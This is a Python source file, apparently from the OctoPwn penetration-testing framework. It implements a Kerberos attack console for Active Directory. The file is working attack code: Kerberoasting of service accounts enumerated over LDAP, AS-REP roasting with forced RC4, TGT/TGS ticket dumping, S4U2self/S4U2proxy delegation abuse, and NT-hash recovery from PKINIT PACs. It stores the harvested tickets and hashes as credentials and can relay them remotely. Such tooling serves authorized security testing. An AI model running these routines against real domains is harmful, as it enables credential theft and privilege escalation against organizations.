import copy
import platform

from aiosmb import logger
from octopwn.clients.base import ClientConsoleBase
from octopwn.common.credential import Credential
from octopwn.remote.protocol.python import kerberos_pb2
from octopwn.clients.kerberos.utils import format_kirbi, describe_kirbi_data
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.security import Kerberoast, APREPRoast
from minikerberos.common.utils import tgt_to_kirbi
from minikerberos.protocol.asn1_structs import AP_REQ
from asyauth.protocols.kerberos.gssapi import KRB5_MECH_INDEP_TOKEN

class KerberosClient(ClientConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ClientConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue,prompt, octopwnobj)
		# the connection object is in fact a tuple of KerberosCredential and KerberosTarget
		self.nologon_commands.append('any')
		self.connection = connection
		self.target = self.connection[0]
		self.credential_base = self.connection[1]
		self.credential = self.credential_base.to_ccred()
	
	async def start(self):
		return True, None

	def isint(self, x):
		try:
			x = int(x)
			return True
		except:
			return False

	async def do_kerberoast(self, spn:str, to_print:bool = True, h_token:int = None):
		"""Kerberoast user"""
		try:
			results = []
			spns = []
			if self.isint(spn) is True:
				spn = int(spn)
				client_config, ldapclient = self.octopwnobj.clients[spn]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_service_users():
					if err is not None:
						raise err
				
					credential = KerberosSPN()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name

					spns.append(credential)
					
			else:
				spns.append(KerberosSPN.from_user_email(spn))
			
			if self.credential is not None:
				kr = Kerberoast(self.target, self.credential)
				results = await kr.run(spns)
			else:
				if platform.system() == 'Windows':
					# using SSPI
					results, errors, err = await self.kerberoast_windows(spns)
					if err is not None:
						raise err
				else:
					# using WSNET
					results, errors, err = await self.kerberoast_wsnet(spns)
					if err is not None:
						raise err
							
			for result in results:
				if to_print is True:
					await self.print(result)
				
				username = ''
				domain = ''
				try:
					username = spn.split('@')[0]
					domain = spn.split('@')[1]
				except:
					pass

				cred = Credential(username, result, 'KERBEROAST', domain=domain, source='KERBEROAST-%s' % self.client_id, description='KERBEROAST')
				_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
				if err is not None and to_print is True:
					await self.print('Failed to add kerberoast credential for user %s Reason: %s' % (username, err))
				
				if h_token is not None:
					msg = kerberos_pb2.KerberosKerberoast()
					msg.username = username
					msg.domain = domain
					msg.ticket = result
					await self.remotemsg(msg)
			
			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_asreproast(self, user:str, to_print:bool = True, h_token:int = None):
		"""ASREPRoast user. Target is expected in user@FQDN format !OR! Integer denoting an active LDAP client for automatic kerberoast."""
		try:
			results = []
			if self.isint(user) is True:
				user = int(user)
				client_config, ldapclient = self.octopwnobj.clients[user]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_knoreq_users():
					if err is not None:
						raise err
				
					credential = KerberosCredential()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name
					
					kr = APREPRoast(self.target)
					result = await kr.run(credential, override_etype = [23])
					if result is not None:
						results.append(result)
						if to_print is True:
							await self.print(result)
						
						if h_token is not None:
							msg = kerberos_pb2.KerberosASREP()
							msg.username = user.sAMAccountName
							msg.domain = ldapclient.domain_name
							msg.ticket = result
							await self.remotemsg(msg)


			else:
				user, domain = user.split('@',1)
				credential = KerberosCredential()
				credential.username = user
				credential.domain = domain

				kr = APREPRoast(self.target)
				result = await kr.run(credential, override_etype = [23])
				if result is not None:
					results.append(result)
					if to_print is True:
						await self.print(result)
					
					cred = Credential(user, result, 'ASREPROAST', domain=domain, source='ASREPROAST-%s' % self.client_id, description='ASREPROAST')
					_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
					if err is not None and to_print is True:
						await self.print('Failed to add asreproast credential for user %s Reason: %s' % (user, err))
					
					if h_token is not None:
						msg = kerberos_pb2.KerberosASREP()
						msg.username = user
						msg.domain = domain
						msg.ticket = result
						await self.remotemsg(msg)

			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_tgt(self, etype=None, to_print:bool = True, h_token:int = None):
		"""Obtains TGT for current user"""
		try:
			if self.credential is None:
				raise Exception('SSPI and WSNET not supported here!')
			if etype is None or etype == '':
				etype = [23,17,18]
			else:
				etype = [int(etype)]
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT(override_etype=etype)
			kirbi = tgt_to_kirbi(connection.kerberos_TGT, connection.kerberos_TGT_encpart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))

			cred = Credential(self.credential.username, format_kirbi(kirbi).replace(' ', ''), 'TGT', domain=self.credential.domain, source='TGT-%s' % self.client_id, description='TGT')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add asreproast credential for user %s Reason: %s' % (self.credential.username, err))
			
			if h_token is not None:
				msg = kerberos_pb2.KerberosTGT()
				msg.username = self.credential.username
				msg.domain = self.credential.domain
				msg.ticket = format_kirbi(kirbi).replace(' ', '')
				await self.remotemsg(msg)

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_tgs(self, spn:str, to_print:bool = True, h_token:int = None):
		"""Gets TGS for SPN"""
		try:
			if spn.find('@') != -1:
				kspn = KerberosSPN.from_user_email(spn)
			else:
				kspn = KerberosSPN.from_target_string(spn)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			tgs, encTGSRepPart, key = await connection.get_TGS(kspn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))

			cred = Credential(kspn.username, format_kirbi(kirbi).replace(' ', ''), 'TGS', domain=kspn.domain, source='TGS-%s' % self.client_id, description='TGS')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add asreproast credential for user %s Reason: %s' % (kspn.username, err))
			
			if h_token is not None:
				msg = kerberos_pb2.KerberosTGS()
				msg.username = kspn.username
				msg.domain = kspn.domain
				msg.ticket = format_kirbi(kirbi).replace(' ', '')
				await self.remotemsg(msg)

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_s4uproxy(self, spn, targetuser, to_print = True):
		"""S4U proxy. SPN: spn format. targetuser: user@FQDN format"""
		try:
			service_spn = KerberosSPN.from_target_string(spn)
			target_user = KerberosSPN.from_user_email(targetuser)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			logger.debug('Getting ST')
			tgs, encTGSRepPart, key = await connection.getST(target_user, service_spn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))
			
			cred = Credential(target_user.username, format_kirbi(kirbi).replace(' ', ''), 'TGS', domain=target_user.domain, source='TGS-%s' % self.client_id, description='TGS')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add credential for user %s Reason: %s' % (target_user.username, err))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_s4uself(self, targetuser:str, to_print=True):
		"""S4U Self. targetuser: user@FQDN format"""
		try:
			target_user = KerberosSPN.from_user_email(targetuser)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			logger.debug('Getting ST')
			tgs, encTGSRepPart, key = await connection.S4U2self(target_user)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))
			
			cred = Credential(target_user.username, format_kirbi(kirbi).replace(' ', ''), 'TGS', domain=target_user.domain, source='TGS-%s' % self.client_id, description='TGS')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add credential for user %s Reason: %s' % (target_user.username, err))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_nt(self):
		"""Gets NT hash from a PKINIT (cert) auth"""
		try:
			client = AIOKerberosClient(self.credential, self.target)
			tgs, enctgs, key, decticket = await client.U2U()
			results = client.get_NT_from_PAC(decticket)
			for result in results:
				await self.print('%s : %s' % (result[0], result[1]))
				if result[0] == 'NT':
					cred = Credential(
						self.credential.username, 
						result[1], 
						'NT',
						domain=self.credential.domain
					)
					await self.octopwnobj.addcredential_obj(cred, to_print=False)


			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e


	async def kerberoast_windows(self, targets:str):
		try:
			if platform.system() != 'Windows':
				await self.print('[-]This command only works on Windows!')
				return None, None, Exception('[-]This command only works on Windows!')
			try:
				from winsspi.sspi import KerberoastSSPI
				from minikerberos.common.utils import TGSTicket2hashcat
			except ImportError:
				return None, None, Exception('winsspi module not installed!')

			results = []
			errors = []
			for cred in targets:
				try:
					spn_name = str(cred)
					ksspi = KerberoastSSPI()
					try:
						ticket = ksspi.get_ticket_for_spn(spn_name)
					except Exception as e:
						errors.append((spn_name, e))
						continue
					results.append(TGSTicket2hashcat(ticket))
				except Exception as e:
					print("spnroast-sspi for user %s failed. Reason: %s" % (cred, e))
			
			return results, errors, None
		except Exception as e:
			return None, None, e
	
	async def kerberoast_wsnet(self, targets):
		try:
			if platform.system() != 'Emscripten':
				await self.print('[-]This command only works in the browser!')
				return None, None, Exception('[-]This command only works in the browser!')
			try:
				from wsnet.pyodide.clientauth import WSNETAuth
				from minikerberos.common.utils import TGSTicket2hashcat
			except ImportError:
				return None, None, Exception('winsspi module not installed!')

			results = []
			errors = []
			for cred in targets:
				try:
					wa = WSNETAuth()
					await wa.setup()
					status, ctxattr, authdata, err = await wa.authenticate('KERBEROS', '<CURRENT>', str(cred), 3, 0, b'')#credusage, flags, authdata)
					if err is not None:
						raise err
					unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(authdata)
					aprep = AP_REQ.load(unwrap.data[2:]).native
					results.append(TGSTicket2hashcat(aprep))
				except Exception as e:
					print("spnroast-wsnet for user %s failed. Reason: %s" % (cred, e))
			
			return results, errors, None
		except Exception as e:
			return None, None, e